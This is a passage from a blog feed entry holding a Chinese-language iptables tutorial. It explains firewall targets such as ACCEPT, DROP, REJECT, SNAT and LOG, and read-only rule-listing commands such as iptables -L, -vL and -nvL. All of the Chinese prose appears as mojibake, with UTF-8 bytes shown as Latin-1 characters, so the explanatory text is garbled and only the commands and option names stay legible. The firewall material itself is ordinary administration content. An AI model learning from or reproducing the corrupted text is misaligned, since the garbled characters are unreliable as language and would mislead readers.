Port</p><p>ä¸Šè¿°å†…å®¹éƒ½å¯ä»¥ä½œä¸ºæ‰©å±•åŒ¹é…æ¡ä»¶</p><ul><li>å¤„ç†åŠ¨ä½œ</li></ul><p>å¤„ç†åŠ¨ä½œåœ¨iptablesä¸­è¢«ç§°ä¸ºtargetï¼ˆè¿™æ ·è¯´å¹¶ä¸å‡†ç¡®ï¼Œæˆ‘ä»¬æš‚ä¸”è¿™æ ·ç§°å‘¼ï¼‰ï¼ŒåŠ¨ä½œä¹Ÿå¯ä»¥åˆ†ä¸ºåŸºæœ¬åŠ¨ä½œå’Œæ‰©å±•åŠ¨ä½œã€‚</p><p>æ­¤å¤„åˆ—å‡ºä¸€äº›å¸¸ç”¨çš„åŠ¨ä½œï¼Œä¹‹åçš„æ–‡ç« ä¼šå¯¹å®ƒä»¬è¿›è¡Œè¯¦ç»†çš„ç¤ºä¾‹ä¸æ€»ç»“ï¼š</p><p><strong>ACCEPT</strong>ï¼šå…è®¸æ•°æ®åŒ…é€šè¿‡ã€‚</p><p><strong>DROP</strong>ï¼šç›´æ¥ä¸¢å¼ƒæ•°æ®åŒ…ï¼Œä¸ç»™ä»»ä½•å›åº”ä¿¡æ¯ï¼Œè¿™æ—¶å€™å®¢æˆ·ç«¯ä¼šæ„Ÿè§‰è‡ªå·±çš„è¯·æ±‚æ³¥ç‰›å…¥æµ·äº†ï¼Œè¿‡äº†è¶…æ—¶æ—¶é—´æ‰ä¼šæœ‰ååº”ã€‚</p><p><strong>REJECT</strong>ï¼šæ‹’ç»æ•°æ®åŒ…é€šè¿‡ï¼Œå¿…è¦æ—¶ä¼šç»™æ•°æ®å‘é€ç«¯ä¸€ä¸ªå“åº”çš„ä¿¡æ¯ï¼Œå®¢æˆ·ç«¯åˆšè¯·æ±‚å°±ä¼šæ”¶åˆ°æ‹’ç»çš„ä¿¡æ¯ã€‚</p><p><strong>SNAT</strong>ï¼šæºåœ°å€è½¬æ¢ï¼Œè§£å†³å†…ç½‘ç”¨æˆ·ç”¨åŒä¸€ä¸ªå…¬ç½‘åœ°å€ä¸Šç½‘çš„é—®é¢˜ã€‚</p><p><strong>MASQUERADE</strong>ï¼šæ˜¯SNATçš„ä¸€ç§ç‰¹æ®Šå½¢å¼ï¼Œé€‚ç”¨äºåŠ¨æ€çš„ã€ä¸´æ—¶ä¼šå˜çš„ipä¸Šã€‚</p><p><strong>DNAT</strong>ï¼šç›®æ ‡åœ°å€è½¬æ¢ã€‚</p><p><strong>REDIRECT</strong>ï¼šåœ¨æœ¬æœºåšç«¯å£æ˜ å°„ã€‚</p><p><strong>LOG</strong>ï¼šåœ¨/var/log/messagesæ–‡ä»¶ä¸­è®°å½•æ—¥å¿—ä¿¡æ¯ï¼Œç„¶åå°†æ•°æ®åŒ…ä¼ é€’ç»™ä¸‹ä¸€æ¡è§„åˆ™ï¼Œä¹Ÿå°±æ˜¯è¯´é™¤äº†è®°å½•ä»¥å¤–ä¸å¯¹æ•°æ®åŒ…åšä»»ä½•å…¶ä»–æ“ä½œï¼Œä»ç„¶è®©ä¸‹ä¸€æ¡è§„åˆ™å»åŒ¹é…ã€‚</p><h1 id="iptables-å®é™…æ“ä½œä¹‹è§„åˆ™æŸ¥è¯¢"><a href="#iptables-å®é™…æ“ä½œä¹‹è§„åˆ™æŸ¥è¯¢" class="headerlink" title="iptables å®é™…æ“ä½œä¹‹è§„åˆ™æŸ¥è¯¢"></a>iptables å®é™…æ“ä½œä¹‹è§„åˆ™æŸ¥è¯¢</h1><p>iptablesä¸ºæˆ‘ä»¬é¢„å®šä¹‰äº†4å¼ è¡¨ï¼Œå®ƒä»¬åˆ†åˆ«æ˜¯rawè¡¨ã€mangleè¡¨ã€natè¡¨ã€filterè¡¨ï¼Œä¸åŒçš„è¡¨æ‹¥æœ‰ä¸åŒçš„åŠŸèƒ½ã€‚</p><p>filterè´Ÿè´£è¿‡æ»¤åŠŸèƒ½ï¼Œæ¯”å¦‚å…è®¸å“ªäº›IPåœ°å€è®¿é—®ï¼Œæ‹’ç»å“ªäº›IPåœ°å€è®¿é—®ï¼Œå…è®¸è®¿é—®å“ªäº›ç«¯å£ï¼Œç¦æ­¢è®¿é—®å“ªäº›ç«¯å£ï¼Œfilterè¡¨ä¼šæ ¹æ®æˆ‘ä»¬å®šä¹‰çš„è§„åˆ™è¿›è¡Œè¿‡æ»¤ï¼Œfilterè¡¨åº”è¯¥æ˜¯æˆ‘ä»¬æœ€å¸¸ç”¨åˆ°çš„è¡¨äº†ï¼Œæ‰€ä»¥æ­¤å¤„ï¼Œæˆ‘ä»¬ä»¥filterè¡¨ä¸ºä¾‹ï¼Œå¼€å§‹å­¦ä¹ æ€æ ·å®é™…æ“ä½œiptablesã€‚</p><ul><li>æŸ¥çœ‹filter è¡¨ä¸­çš„è§„åˆ™</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -t filter -L</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨-té€‰é¡¹ï¼ŒæŒ‡å®šè¦æ“ä½œçš„è¡¨ï¼Œä½¿ç”¨-Lé€‰é¡¹ï¼ŒæŸ¥çœ‹-té€‰é¡¹å¯¹åº”çš„è¡¨çš„è§„åˆ™ï¼Œ-Lé€‰é¡¹çš„æ„æ€æ˜¯ï¼Œåˆ—å‡ºè§„åˆ™ï¼Œæ‰€ä»¥ï¼Œä¸Šè¿°å‘½ä»¤çš„å«ä¹‰ä¸ºåˆ—å‡ºfilterè¡¨çš„æ‰€æœ‰è§„åˆ™</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200826222419.png" alt="image-20200826222325023"></p><p>ä»ä¸Šå›¾ä¸­å¯ä»¥çœ‹å‡ºï¼ŒINPUTé“¾ã€FORWARDé“¾ã€OUTPUTé“¾éƒ½æ‹¥æœ‰â€è¿‡æ»¤â€çš„èƒ½åŠ›ï¼Œæ‰€ä»¥ï¼Œå½“æˆ‘ä»¬è¦å®šä¹‰æŸæ¡â€è¿‡æ»¤â€çš„è§„åˆ™æ—¶ï¼Œæˆ‘ä»¬ä¼šåœ¨filterè¡¨ä¸­å®šä¹‰ï¼Œä½†æ˜¯å…·ä½“åœ¨å“ªæ¡â€é“¾â€ä¸Šå®šä¹‰è§„åˆ™å‘¢ï¼Ÿè¿™å–å†³äºæˆ‘ä»¬çš„å·¥ä½œåœºæ™¯ã€‚æ¯”å¦‚ï¼Œ<strong>æˆ‘ä»¬éœ€è¦ç¦æ­¢æŸä¸ªIPåœ°å€è®¿é—®æˆ‘ä»¬çš„ä¸»æœºï¼Œæˆ‘ä»¬åˆ™éœ€è¦åœ¨INPUTé“¾ä¸Šå®šä¹‰è§„åˆ™ã€‚å› ä¸ºï¼Œæˆ‘ä»¬åœ¨ç†è®ºæ€»ç»“ä¸­å·²ç»æåˆ°è¿‡ï¼ŒæŠ¥æ–‡å‘å¾€æœ¬æœºæ—¶ï¼Œä¼šç»è¿‡PREROUTINGé“¾ä¸INPUTé“¾ï¼Œå¦‚æœæˆ‘ä»¬æƒ³è¦ç¦æ­¢æŸäº›æŠ¥æ–‡å‘å¾€æœ¬æœºï¼Œæˆ‘ä»¬åªèƒ½åœ¨PREROUTINGé“¾å’ŒINPUTé“¾ä¸­å®šä¹‰è§„åˆ™ï¼Œä½†æ˜¯PREROUTINGé“¾å¹¶ä¸å­˜åœ¨äºfilterè¡¨ä¸­ï¼Œæ¢å¥è¯è¯´å°±æ˜¯ï¼ŒPREROUTINGå…³å¡å¤©ç”Ÿå°±æ²¡æœ‰è¿‡æ»¤çš„èƒ½åŠ›ï¼Œæ‰€ä»¥ï¼Œæˆ‘ä»¬åªèƒ½åœ¨INPUTé“¾ä¸­å®šä¹‰</strong>ï¼Œå½“ç„¶ï¼Œå¦‚æœæ˜¯å…¶ä»–å·¥ä½œåœºæ™¯ï¼Œå¯èƒ½éœ€è¦åœ¨FORWARDé“¾æˆ–è€…OUTPUTé“¾ä¸­å®šä¹‰è¿‡æ»¤è§„åˆ™ã€‚</p><p>æŸ¥è¯¢å…¶ä»–è¡¨ä¸­çš„è§„åˆ™ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">iptables -t raw -L</span><br><span class="line"></span><br><span class="line">iptables -t mangle -L</span><br><span class="line"></span><br><span class="line">iptables -t nat -L</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœç•¥-t filterï¼Œå½“æ²¡æœ‰ä½¿ç”¨-té€‰é¡¹æŒ‡å®šè¡¨æ—¶ï¼Œé»˜è®¤ä¸ºæ“ä½œfilterè¡¨ï¼Œå³iptables -Lè¡¨ç¤ºåˆ—å‡ºfilterè¡¨ä¸­çš„æ‰€æœ‰è§„åˆ™ã€‚</p><ul><li>æŸ¥è¯¢æŒ‡å®šè¡¨ä¸­æŒ‡å®šé“¾çš„è§„åˆ™</li></ul><p>å› ä¸ºæˆ‘çš„vps æ²¡æœ‰é…ç½®iptablesï¼Œæ‰€ä»¥å›¾ç‰‡å°±ç›´æ¥æŠ„ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">iptables -L INPUT(æ³¨æ„å¤§å°å†™)</span><br><span class="line">æŸ¥è¯¢æ›´è¯¦ç»†çš„æ•°æ®å¯ä»¥ä½¿ç”¨-v é€‰é¡¹</span><br><span class="line">iptables -vL INPUT</span><br></pre></td></tr></table></figure><p><code>pkts bytes target     prot opt in     out     source               destination        </code></p><p><img src="http://www.zsythink.net/wp-content/uploads/2017/04/041317_0547_3.png"></p><p><strong>pkts</strong>:å¯¹åº”è§„åˆ™åŒ¹é…åˆ°çš„æŠ¥æ–‡çš„ä¸ªæ•°ã€‚</p><p><strong>bytes</strong>:å¯¹åº”åŒ¹é…åˆ°çš„æŠ¥æ–‡åŒ…çš„å¤§å°æ€»å’Œã€‚</p><p><strong>target</strong>:è§„åˆ™å¯¹åº”çš„targetï¼Œå¾€å¾€è¡¨ç¤ºè§„åˆ™å¯¹åº”çš„â€åŠ¨ä½œâ€ï¼Œå³è§„åˆ™åŒ¹é…æˆåŠŸåéœ€è¦é‡‡å–çš„æªæ–½ã€‚</p><p><strong>prot</strong>:è¡¨ç¤ºè§„åˆ™å¯¹åº”çš„åè®®ï¼Œæ˜¯å¦åªé’ˆå¯¹æŸäº›åè®®åº”ç”¨æ­¤è§„åˆ™ã€‚</p><p><strong>opt</strong>:è¡¨ç¤ºè§„åˆ™å¯¹åº”çš„é€‰é¡¹ã€‚</p><p><strong>in</strong>:è¡¨ç¤ºæ•°æ®åŒ…ç”±å“ªä¸ªæ¥å£(ç½‘å¡)æµå…¥ï¼Œæˆ‘ä»¬å¯ä»¥è®¾ç½®é€šè¿‡å“ªå—ç½‘å¡æµå…¥çš„æŠ¥æ–‡éœ€è¦åŒ¹é…å½“å‰è§„åˆ™ã€‚</p><p><strong>out</strong>:è¡¨ç¤ºæ•°æ®åŒ…ç”±å“ªä¸ªæ¥å£(ç½‘å¡)æµå‡ºï¼Œæˆ‘ä»¬å¯ä»¥è®¾ç½®é€šè¿‡å“ªå—ç½‘å¡æµå‡ºçš„æŠ¥æ–‡éœ€è¦åŒ¹é…å½“å‰è§„åˆ™ã€‚</p><p><strong>source</strong>:è¡¨ç¤ºè§„åˆ™å¯¹åº”çš„æºå¤´åœ°å€ï¼Œå¯ä»¥æ˜¯ä¸€ä¸ªIPï¼Œä¹Ÿå¯ä»¥æ˜¯ä¸€ä¸ªç½‘æ®µã€‚</p><p><strong>destination</strong>:è¡¨ç¤ºè§„åˆ™å¯¹åº”çš„ç›®æ ‡åœ°å€ã€‚å¯ä»¥æ˜¯ä¸€ä¸ªIPï¼Œä¹Ÿå¯ä»¥æ˜¯ä¸€ä¸ªç½‘æ®µã€‚</p><p>ä¸Šå›¾ä¸­çš„æºåœ°å€ä¸ç›®æ ‡åœ°å€éƒ½ä¸ºanywhereï¼Œçœ‹æ¥ï¼Œiptablesé»˜è®¤ä¸ºæˆ‘ä»¬è¿›è¡Œäº†åç§°è§£æï¼Œä½†æ˜¯åœ¨è§„åˆ™éå¸¸å¤šçš„æƒ…å†µä¸‹å¦‚æœè¿›è¡Œåç§°è§£æï¼Œæ•ˆç‡ä¼šæ¯”è¾ƒä½ï¼Œæ‰€ä»¥ï¼Œåœ¨æ²¡æœ‰æ­¤éœ€æ±‚çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥<strong>ä½¿ç”¨-né€‰é¡¹ï¼Œè¡¨ç¤ºä¸å¯¹IPåœ°å€è¿›è¡Œåç§°åè§£ï¼Œç›´æ¥æ˜¾ç¤ºIPåœ°å€</strong>ï¼Œç¤ºä¾‹å¦‚ä¸‹ã€‚</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -nvL</span><br></pre></td></tr></table></figure><p><img src="http://www.zsythink.net/wp-content/uploads/2017/04/041317_0547_4.png"></p><p>å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œè§„åˆ™ä¸­çš„æºåœ°å€ä¸ç›®æ ‡åœ°å€å·²ç»æ˜¾ç¤ºä¸ºIPï¼Œè€Œéè½¬æ¢åçš„åç§°ã€‚</p><p>ä½¿ç”¨<code>--line-numbers</code> å³å¯æ˜¾ç¤ºè§„åˆ™çš„ç¼–å·</p><p><img src="http://www.zsythink.net/wp-content/uploads/2017/04/041317_0547_5.png"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200826224157.png" alt="image-20200826224155655"></p><p>å¦‚å›¾ï¼Œæ¯ä¸ªé“¾çš„åé¢éƒ½æœ‰ä¸€ä¸ªæ‹¬å·ï¼Œæ‹¬å·åé¢æœ‰ä¸€äº›ä¿¡æ¯ï¼š</p><p><strong>policy</strong>è¡¨ç¤ºå½“å‰é“¾çš„é»˜è®¤ç­–ç•¥ï¼Œpolicy ACCEPTè¡¨ç¤ºä¸Šå›¾ä¸­INPUTçš„é“¾çš„é»˜è®¤åŠ¨ä½œä¸ºACCEPT</p><p><strong>packets</strong>è¡¨ç¤ºå½“å‰é“¾ï¼ˆä¸Šä¾‹ä¸ºINPUTé“¾ï¼‰é»˜è®¤ç­–ç•¥åŒ¹é…åˆ°çš„åŒ…çš„æ•°é‡ï¼Œ0 packetsè¡¨ç¤ºé»˜è®¤ç­–ç•¥åŒ¹é…åˆ°0ä¸ªåŒ…ã€‚</p><p><strong>bytes</strong>è¡¨ç¤ºå½“å‰é“¾é»˜è®¤ç­–ç•¥åŒ¹é…åˆ°çš„æ‰€æœ‰åŒ…çš„å¤§å°æ€»å’Œã€‚</p><p>å…¶å®ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠpacketsä¸bytesç§°ä½œâ€è®¡æ•°å™¨â€ï¼Œä¸Šå›¾ä¸­çš„è®¡æ•°å™¨è®°å½•äº†é»˜è®¤ç­–ç•¥åŒ¹é…åˆ°çš„æŠ¥æ–‡æ•°é‡ä¸æ€»å¤§å°ï¼Œâ€è®¡æ•°å™¨â€åªä¼šåœ¨ä½¿ç”¨-vé€‰é¡¹æ—¶ï¼Œæ‰ä¼šæ˜¾ç¤ºå‡ºæ¥ã€‚</p><p>å¦‚æœè¦æŸ¥çœ‹æ›´ç²¾ç¡®çš„è®¡æ•°å€¼ï¼Œå¯ä»¥ä½¿ç”¨<code>-x</code>é€‰é¡¹ã€‚</p><h1 id="Iptables-è§„åˆ™ç®¡ç†"><a href="#Iptables-è§„åˆ™ç®¡ç†" class="headerlink" title="Iptables è§„åˆ™ç®¡ç†"></a>Iptables è§„åˆ™ç®¡ç†</h1><p><a href="http://www.zsythink.net/archives/1517">http://www.zsythink.net/archives/1517</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;å‚è€ƒèµ„æ–™ï¼š &lt;/p&gt;
&lt;p&gt;(å†…å®¹å’Œå›¾ç‰‡)&lt;/p&gt;
&lt;p&gt;å…¨æ•™ç¨‹ç³»åˆ—&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://www.zsythink.net/archives/tag/iptables/&quot;&gt;iptables å…¥é—¨ç³»åˆ—&lt;/a&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;</summary>
      
    
    
    
    <category term="è¿ç»´çŸ¥è¯†" scheme="https://hack-for.fun/categories/%E8%BF%90%E7%BB%B4%E7%9F%A5%E8%AF%86/"/>
    
    
    <category term="iptables" scheme="https://hack-for.fun/tags/iptables/"/>
    
  </entry>
  
</feed>
